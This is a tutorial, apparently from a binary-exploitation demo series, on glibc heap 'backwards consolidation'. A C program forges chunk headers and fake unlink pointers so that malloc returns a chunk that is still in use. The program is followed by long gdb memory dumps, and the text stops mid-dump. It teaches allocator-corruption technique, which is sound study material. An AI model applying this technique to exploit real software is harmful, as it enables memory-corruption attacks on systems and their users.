# bk consolidation

So in this instance, we will consolidate a chunk backwards, instead of forwards. With forward consolidation, we created fake chunks, and consolidated those. In this instance, we will consolidate existing chunks.

Here is the code:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x420


void main() {

    long *chunk0,
            *chunk1,
            *chunk2,
            *consolidated_chunk;

    printf("In this instance, we will try to allocate a chunk twice.\n");
    printf("We will do this via consolidating the next adjacent chunk backwards, to encompass the entirety of the two chunks.\n");
    printf("Then we will allocate the larger consolidated chunk, which encompasses both of the chunks.\n");
    printf("Let's allocate three chunks for us to use!\n\n");

    chunk0 = malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE0);
    chunk2 = malloc(CHUNK_SIZE0);

    printf("Chunk0:\t%p\n", chunk0);
    printf("Chunk1:\t%p\n", chunk1);
    printf("Chunk2:\t%p\n\n", chunk2);

    printf("After some prep, we will free chunk1, to consolidate it into chunk0.\n");
    printf("Then we will reallocate the memory of chunk0 without actually freeing it.\n\n");

    printf("Starting off, we will change the chunk header of chunk1, to make it look like the previous chunk is freed.\n");
    printf("We will need to set the prev_size equal to the size of chunk1.\n");
    printf("In addition to that, we will need to clear the prev_inuse flag of the size value of chunk1.\n\n");

    chunk1[-2] = (CHUNK_SIZE0 + 0x10);
    chunk1[-1] = (CHUNK_SIZE0 + 0x10);

    printf("Next up, we will have to prepare again for the main arena bin unlinking of chunk0.\n");
    printf("We will store the fake main arena head chunk in chunk2.\n\n");

    chunk0[0] = (long)chunk2;
    chunk0[1] = (long)chunk2;

    chunk2[2] = (long)&chunk0[-2];
    chunk2[3] = (long)&chunk0[-2];

    printf("Now, we will free chunk1, to cause heap consolidation.\n\n");

    free(chunk1);

    printf("Finally we will allocate a chunk size, to get the consolidated chunk allocated.\n\n");

    consolidated_chunk = malloc(((CHUNK_SIZE0 + 0x10) * 2) - 0x10);

    printf("Consolidated Chunk:\t%p\n", consolidated_chunk);
    printf("Consolidated Chunk is the same address as Chunk0:\t%s\n\n", (consolidated_chunk == chunk0) ? "True" : "False");
}
```

## Explanation

So we will be wanting to consolidate `chunk1` backwards into chunk0, then reallocate it (effectively reallocate `chunk0` without freeing it).

To start off, we will change the chunk metadata of `chunk1`, to make it look like `chunk0` has been freed. This means we have to set it's `prev_size` to be the size of `chunk0`, and clear the `prev_inuse` flag bit.

After that, we will set up `chunk0` to be unlinked. We will store the chunk it points to in `chunk2`.

Let's see the code in action:

```
$   gdb ./bk
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.01ms using Python engine 3.10
Reading symbols from ./bk...
(No debugging symbols found in ./bk)
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011a9 <+0>: endbr64
   0x00000000000011ad <+4>: push   rbp
   0x00000000000011ae <+5>: mov rbp,rsp
   0x00000000000011b1 <+8>: sub rsp,0x20
   0x00000000000011b5 <+12>:    lea rax,[rip+0xe4c]     # 0x2008
   0x00000000000011bc <+19>:    mov rdi,rax
   0x00000000000011bf <+22>:    call   0x1090 <puts@plt>
   0x00000000000011c4 <+27>:    lea rax,[rip+0xe7d]     # 0x2048
   0x00000000000011cb <+34>:    mov rdi,rax
   0x00000000000011ce <+37>:    call   0x1090 <puts@plt>
   0x00000000000011d3 <+42>:    lea rax,[rip+0xee6]     # 0x20c0
   0x00000000000011da <+49>:    mov rdi,rax
   0x00000000000011dd <+52>:    call   0x1090 <puts@plt>
   0x00000000000011e2 <+57>:    lea rax,[rip+0xf37]     # 0x2120
   0x00000000000011e9 <+64>:    mov rdi,rax
   0x00000000000011ec <+67>:    call   0x1090 <puts@plt>
   0x00000000000011f1 <+72>:    mov edi,0x420
   0x00000000000011f6 <+77>:    call   0x10b0 <malloc@plt>
   0x00000000000011fb <+82>:    mov QWORD PTR [rbp-0x20],rax
   0x00000000000011ff <+86>:    mov edi,0x420
   0x0000000000001204 <+91>:    call   0x10b0 <malloc@plt>
   0x0000000000001209 <+96>:    mov QWORD PTR [rbp-0x18],rax
   0x000000000000120d <+100>:   mov edi,0x420
   0x0000000000001212 <+105>:   call   0x10b0 <malloc@plt>
   0x0000000000001217 <+110>:   mov QWORD PTR [rbp-0x10],rax
   0x000000000000121b <+114>:   mov rax,QWORD PTR [rbp-0x20]
   0x000000000000121f <+118>:   mov rsi,rax
   0x0000000000001222 <+121>:   lea rax,[rip+0xf23]     # 0x214c
   0x0000000000001229 <+128>:   mov rdi,rax
   0x000000000000122c <+131>:   mov eax,0x0
   0x0000000000001231 <+136>:   call   0x10a0 <printf@plt>
   0x0000000000001236 <+141>:   mov rax,QWORD PTR [rbp-0x18]
   0x000000000000123a <+145>:   mov rsi,rax
   0x000000000000123d <+148>:   lea rax,[rip+0xf14]     # 0x2158
   0x0000000000001244 <+155>:   mov rdi,rax
   0x0000000000001247 <+158>:   mov eax,0x0
   0x000000000000124c <+163>:   call   0x10a0 <printf@plt>
   0x0000000000001251 <+168>:   mov rax,QWORD PTR [rbp-0x10]
   0x0000000000001255 <+172>:   mov rsi,rax
   0x0000000000001258 <+175>:   lea rax,[rip+0xf05]     # 0x2164
   0x000000000000125f <+182>:   mov rdi,rax
   0x0000000000001262 <+185>:   mov eax,0x0
   0x0000000000001267 <+190>:   call   0x10a0 <printf@plt>
   0x000000000000126c <+195>:   lea rax,[rip+0xf05]     # 0x2178
   0x0000000000001273 <+202>:   mov rdi,rax
   0x0000000000001276 <+205>:   call   0x1090 <puts@plt>
   0x000000000000127b <+210>:   lea rax,[rip+0xf3e]     # 0x21c0
   0x0000000000001282 <+217>:   mov rdi,rax
   0x0000000000001285 <+220>:   call   0x1090 <puts@plt>
   0x000000000000128a <+225>:   lea rax,[rip+0xf7f]     # 0x2210
   0x0000000000001291 <+232>:   mov rdi,rax
   0x0000000000001294 <+235>:   call   0x1090 <puts@plt>
   0x0000000000001299 <+240>:   lea rax,[rip+0xfe0]     # 0x2280
   0x00000000000012a0 <+247>:   mov rdi,rax
   0x00000000000012a3 <+250>:   call   0x1090 <puts@plt>
   0x00000000000012a8 <+255>:   lea rax,[rip+0x1011]        # 0x22c0
   0x00000000000012af <+262>:   mov rdi,rax
   0x00000000000012b2 <+265>:   call   0x1090 <puts@plt>
   0x00000000000012b7 <+270>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000012bb <+274>:   sub rax,0x10
   0x00000000000012bf <+278>:   mov QWORD PTR [rax],0x430
   0x00000000000012c6 <+285>:   mov rax,QWORD PTR [rbp-0x18]
   0x00000000000012ca <+289>:   sub rax,0x8
   0x00000000000012ce <+293>:   mov QWORD PTR [rax],0x430
   0x00000000000012d5 <+300>:   lea rax,[rip+0x1044]        # 0x2320
   0x00000000000012dc <+307>:   mov rdi,rax
   0x00000000000012df <+310>:   call   0x1090 <puts@plt>
   0x00000000000012e4 <+315>:   lea rax,[rip+0x108d]        # 0x2378
   0x00000000000012eb <+322>:   mov rdi,rax
   0x00000000000012ee <+325>:   call   0x1090 <puts@plt>
   0x00000000000012f3 <+330>:   mov rdx,QWORD PTR [rbp-0x10]
   0x00000000000012f7 <+334>:   mov rax,QWORD PTR [rbp-0x20]
   0x00000000000012fb <+338>:   mov QWORD PTR [rax],rdx
   0x00000000000012fe <+341>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001302 <+345>:   lea rdx,[rax+0x8]
   0x0000000000001306 <+349>:   mov rax,QWORD PTR [rbp-0x10]
   0x000000000000130a <+353>:   mov QWORD PTR [rdx],rax
   0x000000000000130d <+356>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001311 <+360>:   lea rdx,[rax-0x10]
   0x0000000000001315 <+364>:   mov rax,QWORD PTR [rbp-0x10]
   0x0000000000001319 <+368>:   add rax,0x10
   0x000000000000131d <+372>:   mov QWORD PTR [rax],rdx
   0x0000000000001320 <+375>:   mov rax,QWORD PTR [rbp-0x20]
   0x0000000000001324 <+379>:   lea rdx,[rax-0x10]
   0x0000000000001328 <+383>:   mov rax,QWORD PTR [rbp-0x10]
   0x000000000000132c <+387>:   add rax,0x18
   0x0000000000001330 <+391>:   mov QWORD PTR [rax],rdx
   0x0000000000001333 <+394>:   lea rax,[rip+0x107e]        # 0x23b8
   0x000000000000133a <+401>:   mov rdi,rax
   0x000000000000133d <+404>:   call   0x1090 <puts@plt>
   0x0000000000001342 <+409>:   mov rax,QWORD PTR [rbp-0x18]
   0x0000000000001346 <+413>:   mov rdi,rax
   0x0000000000001349 <+416>:   call   0x1080 <free@plt>
   0x000000000000134e <+421>:   lea rax,[rip+0x109b]        # 0x23f0
   0x0000000000001355 <+428>:   mov rdi,rax
   0x0000000000001358 <+431>:   call   0x1090 <puts@plt>
   0x000000000000135d <+436>:   mov edi,0x850
   0x0000000000001362 <+441>:   call   0x10b0 <malloc@plt>
   0x0000000000001367 <+446>:   mov QWORD PTR [rbp-0x8],rax
   0x000000000000136b <+450>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000136f <+454>:   mov rsi,rax
   0x0000000000001372 <+457>:   lea rax,[rip+0x10c8]        # 0x2441
   0x0000000000001379 <+464>:   mov rdi,rax
   0x000000000000137c <+467>:   mov eax,0x0
   0x0000000000001381 <+472>:   call   0x10a0 <printf@plt>
   0x0000000000001386 <+477>:   mov rax,QWORD PTR [rbp-0x8]
   0x000000000000138a <+481>:   cmp rax,QWORD PTR [rbp-0x20]
   0x000000000000138e <+485>:   jne 0x1399 <main+496>
   0x0000000000001390 <+487>:   lea rax,[rip+0x10c2]        # 0x2459
   0x0000000000001397 <+494>:   jmp 0x13a0 <main+503>
   0x0000000000001399 <+496>:   lea rax,[rip+0x10be]        # 0x245e
   0x00000000000013a0 <+503>:   mov rsi,rax
   0x00000000000013a3 <+506>:   lea rax,[rip+0x10be]        # 0x2468
   0x00000000000013aa <+513>:   mov rdi,rax
   0x00000000000013ad <+516>:   mov eax,0x0
   0x00000000000013b2 <+521>:   call   0x10a0 <printf@plt>
   0x00000000000013b7 <+526>:   nop
   0x00000000000013b8 <+527>:   leave  
   0x00000000000013b9 <+528>:   ret    
End of assembler dump.
gef➤  b *main+82
Breakpoint 1 at 0x11fb
gef➤  b *main+110
Breakpoint 2 at 0x1217
gef➤  b *main+416
Breakpoint 3 at 0x1349
gef➤  b *main+421
Breakpoint 4 at 0x134e
gef➤  b *main+446
Breakpoint 5 at 0x1367
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/malloc/bk_consolidation/bk
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
In this instance, we will try to allocate a chunk twice.
We will do this via consolidating the next adjacent chunk backwards, to encompass the entirety of the two chunks.
Then we will allocate the larger consolidated chunk, which encompasses both of the chunks.
Let's allocate three chunks for us to use!


Breakpoint 1, 0x00005555555551fb in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00005555555596b0  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x431           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdfb0  →  0x00007fffffffe3d9  →  0x000034365f363878 ("x86_64"?)
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x0000555555559ad0  →  0x0000000000000000
$rdi   : 0x2             
$rip   : 0x00005555555551fb  →  <main+82> mov QWORD PTR [rbp-0x20], rax
$r8 : 0x0            
$r9 : 0x00005555555596b0  →  0x0000000000000000
$r10   : 0x77            
$r11   : 0x00007ffff7e19ce0  →  0x0000555555559ad0  →  0x0000000000000000
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ec  →  "/Hackery/shogun/pwn_demos/malloc/bk_conso[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb0│+0x0000: 0x00007fffffffe3d9  →  0x000034365f363878 ("x86_64"?)   ← $rsp
0x00007fffffffdfb8│+0x0008: 0x0000000000000064 ("d"?)
0x00007fffffffdfc0│+0x0010: 0x0000000000001000
0x00007fffffffdfc8│+0x0018: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfd0│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdfd8│+0x0028: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffdfe0│+0x0030: 0x0000000000000000
0x00007fffffffdfe8│+0x0038: 0x00005555555551a9  →  <main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551ec <main+67>     call   0x555555555090 <puts@plt>
   0x5555555551f1 <main+72>     mov edi, 0x420
   0x5555555551f6 <main+77>     call   0x5555555550b0 <malloc@plt>
 → 0x5555555551fb <main+82>     mov QWORD PTR [rbp-0x20], rax
   0x5555555551ff <main+86>     mov edi, 0x420
   0x555555555204 <main+91>     call   0x5555555550b0 <malloc@plt>
   0x555555555209 <main+96>     mov QWORD PTR [rbp-0x18], rax
   0x55555555520d <main+100>    mov edi, 0x420
   0x555555555212 <main+105>    call   0x5555555550b0 <malloc@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bk", stopped 0x5555555551fb in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551fb → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$1 = 0x5555555596b0
gef➤  c
Continuing.

Breakpoint 2, 0x0000555555555217 in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559f10  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x431           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdfb0  →  0x00005555555596b0  →  0x0000000000000000
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x000055555555a330  →  0x0000000000000000
$rdi   : 0x2             
$rip   : 0x0000555555555217  →  <main+110> mov QWORD PTR [rbp-0x10], rax
$r8 : 0x0            
$r9 : 0x0000555555559f10  →  0x0000000000000000
$r10   : 0x77            
$r11   : 0x00007ffff7e19ce0  →  0x000055555555a330  →  0x0000000000000000
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ec  →  "/Hackery/shogun/pwn_demos/malloc/bk_conso[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb0│+0x0000: 0x00005555555596b0  →  0x0000000000000000   ← $rsp
0x00007fffffffdfb8│+0x0008: 0x0000555555559ae0  →  0x0000000000000000
0x00007fffffffdfc0│+0x0010: 0x0000000000001000
0x00007fffffffdfc8│+0x0018: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfd0│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdfd8│+0x0028: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffdfe0│+0x0030: 0x0000000000000000
0x00007fffffffdfe8│+0x0038: 0x00005555555551a9  →  <main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555209 <main+96>     mov QWORD PTR [rbp-0x18], rax
   0x55555555520d <main+100>    mov edi, 0x420
   0x555555555212 <main+105>    call   0x5555555550b0 <malloc@plt>
 → 0x555555555217 <main+110>    mov QWORD PTR [rbp-0x10], rax
   0x55555555521b <main+114>    mov rax, QWORD PTR [rbp-0x20]
   0x55555555521f <main+118>    mov rsi, rax
   0x555555555222 <main+121>    lea rax, [rip+0xf23]        # 0x55555555614c
   0x555555555229 <main+128>    mov rdi, rax
   0x55555555522c <main+131>    mov eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bk", stopped 0x555555555217 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555217 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/400g 0x5555555596b0-0x10
0x5555555596a0: 0x0 0x431
0x5555555596b0: 0x0 0x0
0x5555555596c0: 0x0 0x0
0x5555555596d0: 0x0 0x0
0x5555555596e0: 0x0 0x0
0x5555555596f0: 0x0 0x0
0x555555559700: 0x0 0x0
0x555555559710: 0x0 0x0
0x555555559720: 0x0 0x0
0x555555559730: 0x0 0x0
0x555555559740: 0x0 0x0
0x555555559750: 0x0 0x0
0x555555559760: 0x0 0x0
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
0x555555559810: 0x0 0x0
0x555555559820: 0x0 0x0
0x555555559830: 0x0 0x0
0x555555559840: 0x0 0x0
0x555555559850: 0x0 0x0
0x555555559860: 0x0 0x0
0x555555559870: 0x0 0x0
0x555555559880: 0x0 0x0
0x555555559890: 0x0 0x0
0x5555555598a0: 0x0 0x0
0x5555555598b0: 0x0 0x0
0x5555555598c0: 0x0 0x0
0x5555555598d0: 0x0 0x0
0x5555555598e0: 0x0 0x0
0x5555555598f0: 0x0 0x0
0x555555559900: 0x0 0x0
0x555555559910: 0x0 0x0
0x555555559920: 0x0 0x0
0x555555559930: 0x0 0x0
0x555555559940: 0x0 0x0
0x555555559950: 0x0 0x0
0x555555559960: 0x0 0x0
0x555555559970: 0x0 0x0
0x555555559980: 0x0 0x0
0x555555559990: 0x0 0x0
0x5555555599a0: 0x0 0x0
0x5555555599b0: 0x0 0x0
0x5555555599c0: 0x0 0x0
0x5555555599d0: 0x0 0x0
0x5555555599e0: 0x0 0x0
0x5555555599f0: 0x0 0x0
0x555555559a00: 0x0 0x0
0x555555559a10: 0x0 0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x0
0x555555559a50: 0x0 0x0
0x555555559a60: 0x0 0x0
0x555555559a70: 0x0 0x0
0x555555559a80: 0x0 0x0
0x555555559a90: 0x0 0x0
0x555555559aa0: 0x0 0x0
0x555555559ab0: 0x0 0x0
0x555555559ac0: 0x0 0x0
0x555555559ad0: 0x0 0x431
0x555555559ae0: 0x0 0x0
0x555555559af0: 0x0 0x0
0x555555559b00: 0x0 0x0
0x555555559b10: 0x0 0x0
0x555555559b20: 0x0 0x0
0x555555559b30: 0x0 0x0
0x555555559b40: 0x0 0x0
0x555555559b50: 0x0 0x0
0x555555559b60: 0x0 0x0
0x555555559b70: 0x0 0x0
0x555555559b80: 0x0 0x0
0x555555559b90: 0x0 0x0
0x555555559ba0: 0x0 0x0
0x555555559bb0: 0x0 0x0
0x555555559bc0: 0x0 0x0
0x555555559bd0: 0x0 0x0
0x555555559be0: 0x0 0x0
0x555555559bf0: 0x0 0x0
0x555555559c00: 0x0 0x0
0x555555559c10: 0x0 0x0
0x555555559c20: 0x0 0x0
0x555555559c30: 0x0 0x0
0x555555559c40: 0x0 0x0
0x555555559c50: 0x0 0x0
0x555555559c60: 0x0 0x0
0x555555559c70: 0x0 0x0
0x555555559c80: 0x0 0x0
0x555555559c90: 0x0 0x0
0x555555559ca0: 0x0 0x0
0x555555559cb0: 0x0 0x0
0x555555559cc0: 0x0 0x0
0x555555559cd0: 0x0 0x0
0x555555559ce0: 0x0 0x0
0x555555559cf0: 0x0 0x0
0x555555559d00: 0x0 0x0
0x555555559d10: 0x0 0x0
0x555555559d20: 0x0 0x0
0x555555559d30: 0x0 0x0
0x555555559d40: 0x0 0x0
0x555555559d50: 0x0 0x0
0x555555559d60: 0x0 0x0
0x555555559d70: 0x0 0x0
0x555555559d80: 0x0 0x0
0x555555559d90: 0x0 0x0
0x555555559da0: 0x0 0x0
0x555555559db0: 0x0 0x0
0x555555559dc0: 0x0 0x0
0x555555559dd0: 0x0 0x0
0x555555559de0: 0x0 0x0
0x555555559df0: 0x0 0x0
0x555555559e00: 0x0 0x0
0x555555559e10: 0x0 0x0
0x555555559e20: 0x0 0x0
0x555555559e30: 0x0 0x0
0x555555559e40: 0x0 0x0
0x555555559e50: 0x0 0x0
0x555555559e60: 0x0 0x0
0x555555559e70: 0x0 0x0
0x555555559e80: 0x0 0x0
0x555555559e90: 0x0 0x0
0x555555559ea0: 0x0 0x0
0x555555559eb0: 0x0 0x0
0x555555559ec0: 0x0 0x0
0x555555559ed0: 0x0 0x0
0x555555559ee0: 0x0 0x0
0x555555559ef0: 0x0 0x0
0x555555559f00: 0x0 0x431
0x555555559f10: 0x0 0x0
0x555555559f20: 0x0 0x0
0x555555559f30: 0x0 0x0
0x555555559f40: 0x0 0x0
0x555555559f50: 0x0 0x0
0x555555559f60: 0x0 0x0
0x555555559f70: 0x0 0x0
0x555555559f80: 0x0 0x0
0x555555559f90: 0x0 0x0
0x555555559fa0: 0x0 0x0
0x555555559fb0: 0x0 0x0
0x555555559fc0: 0x0 0x0
0x555555559fd0: 0x0 0x0
0x555555559fe0: 0x0 0x0
0x555555559ff0: 0x0 0x0
0x55555555a000: 0x0 0x0
0x55555555a010: 0x0 0x0
0x55555555a020: 0x0 0x0
0x55555555a030: 0x0 0x0
0x55555555a040: 0x0 0x0
0x55555555a050: 0x0 0x0
0x55555555a060: 0x0 0x0
0x55555555a070: 0x0 0x0
0x55555555a080: 0x0 0x0
0x55555555a090: 0x0 0x0
0x55555555a0a0: 0x0 0x0
0x55555555a0b0: 0x0 0x0
0x55555555a0c0: 0x0 0x0
0x55555555a0d0: 0x0 0x0
0x55555555a0e0: 0x0 0x0
0x55555555a0f0: 0x0 0x0
0x55555555a100: 0x0 0x0
0x55555555a110: 0x0 0x0
0x55555555a120: 0x0 0x0
0x55555555a130: 0x0 0x0
0x55555555a140: 0x0 0x0
0x55555555a150: 0x0 0x0
0x55555555a160: 0x0 0x0
0x55555555a170: 0x0 0x0
0x55555555a180: 0x0 0x0
0x55555555a190: 0x0 0x0
0x55555555a1a0: 0x0 0x0
0x55555555a1b0: 0x0 0x0
0x55555555a1c0: 0x0 0x0
0x55555555a1d0: 0x0 0x0
0x55555555a1e0: 0x0 0x0
0x55555555a1f0: 0x0 0x0
0x55555555a200: 0x0 0x0
0x55555555a210: 0x0 0x0
0x55555555a220: 0x0 0x0
0x55555555a230: 0x0 0x0
0x55555555a240: 0x0 0x0
0x55555555a250: 0x0 0x0
0x55555555a260: 0x0 0x0
0x55555555a270: 0x0 0x0
0x55555555a280: 0x0 0x0
0x55555555a290: 0x0 0x0
0x55555555a2a0: 0x0 0x0
0x55555555a2b0: 0x0 0x0
0x55555555a2c0: 0x0 0x0
0x55555555a2d0: 0x0 0x0
0x55555555a2e0: 0x0 0x0
0x55555555a2f0: 0x0 0x0
0x55555555a300: 0x0 0x0
0x55555555a310: 0x0 0x0
```

So we see our three heap chunks right after they have been allocated (`0x5555555596b0/0x555555559ae0/0x555555559f10`). Let's see these chunks after we've prepared them for consolidating chunk0 with chunk1:

```
gef➤  c
Continuing.
Chunk0: 0x5555555596b0
Chunk1: 0x555555559ae0
Chunk2: 0x555555559f10

After some prep, we will free chunk1, to consolidate it into chunk0.
Then we will reallocate the memory of chunk0 without actually freeing it.

Starting off, we will change the chunk header of chunk1, to make it look like the previous chunk is freed.
We will need to set the prev_size equal to the size of chunk1.
In addition to that, we will need to clear the prev_inuse flag of the size value of chunk1.

Next up, we will have to prepare again for the main arena bin unlinking of chunk0.
We will store the fake main arena head chunk in chunk2.

Now, we will free chunk1, to cause heap consolidation.


Breakpoint 3, 0x0000555555555349 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559ae0  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x00007ffff7d14a77  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x1             
$rsp   : 0x00007fffffffdfb0  →  0x00005555555596b0  →  0x0000555555559f10  →  0x0000000000000000
$rbp   : 0x00007fffffffdfd0  →  0x0000000000000001
$rsi   : 0x1             
$rdi   : 0x0000555555559ae0  →  0x0000000000000000
$rip   : 0x0000555555555349  →  <main+416> call 0x555555555080 <free@plt>
$r8 : 0x0            
$r9 : 0x00007fffffffde7c  →  "555555559f10"
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0e8  →  0x00007fffffffe3ec  →  "/Hackery/shogun/pwn_demos/malloc/bk_conso[...]"
$r13   : 0x00005555555551a9  →  <main+0> endbr64
$r14   : 0x0000555555557da8  →  0x0000555555555160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb0│+0x0000: 0x00005555555596b0  →  0x0000555555559f10  →  0x0000000000000000    ← $rsp
0x00007fffffffdfb8│+0x0008: 0x0000555555559ae0  →  0x0000000000000000
0x00007fffffffdfc0│+0x0010: 0x0000555555559f10  →  0x0000000000000000
0x00007fffffffdfc8│+0x0018: 0x00005555555550c0  →  <_start+0> endbr64
0x00007fffffffdfd0│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdfd8│+0x0028: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffdfe0│+0x0030: 0x0000000000000000
0x00007fffffffdfe8│+0x0038: 0x00005555555551a9  →  <main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555533d <main+404>    call   0x555555555090 <puts@plt>
   0x555555555342 <main+409>    mov rax, QWORD PTR [rbp-0x18]
   0x555555555346 <main+413>    mov rdi, rax
 → 0x555555555349 <main+416>    call   0x555555555080 <free@plt>
   ↳  0x555555555080 <free@plt+0>   endbr64
    0x555555555084 <free@plt+4>     bnd jmp QWORD PTR [rip+0x2f2d]      # 0x555555557fb8 <free@got.plt>
    0x55555555508b <free@plt+11>    nop DWORD PTR [rax+rax*1+0x0]
    0x555555555090 <puts@plt+0>     endbr64
    0x555555555094 <puts@plt+4>     bnd jmp QWORD PTR [rip+0x2f25]      # 0x555555557fc0 <puts@got.plt>
    0x55555555509b <puts@plt+11>    nop DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x0000555555559ae0 → 0x0000000000000000,
   $rsi = 0x0000000000000001
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bk", stopped 0x555555555349 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555349 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/400g 0x5555555596a0
0x5555555596a0: 0x0 0x431
0x5555555596b0: 0x555555559f10  0x555555559f10
0x5555555596c0: 0x0 0x0
0x5555555596d0: 0x0 0x0
0x5555555596e0: 0x0 0x0
0x5555555596f0: 0x0 0x0
0x555555559700: 0x0 0x0
0x555555559710: 0x0 0x0
0x555555559720: 0x0 0x0
0x555555559730: 0x0 0x0
0x555555559740: 0x0 0x0
0x555555559750: 0x0 0x0
0x555555559760: 0x0 0x0
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
0x5555555597f0: 0x0 0x0
0x555555559800: 0x0 0x0
0x555555559810: 0x0 0x0
0x555555559820: 0x0 0x0
0x555555559830: 0x0 0x0
0x555555559840: 0x0 0x0
0x555555559850: 0x0 0x0
0x555555559860: 0x0 0x0
0x555555559870: 0x0 0x0
0x555555559880: 0x0 0x0
0x555555559890: 0x0 0x0
0x5555555598a0: 0x0 0x0
0x5555555598b0: 0x0 0x0
0x5555555598c0: 0x0 0x0
0x5555555598d0: 0x0 0x0
0x5555555598e0: 0x0 0x0
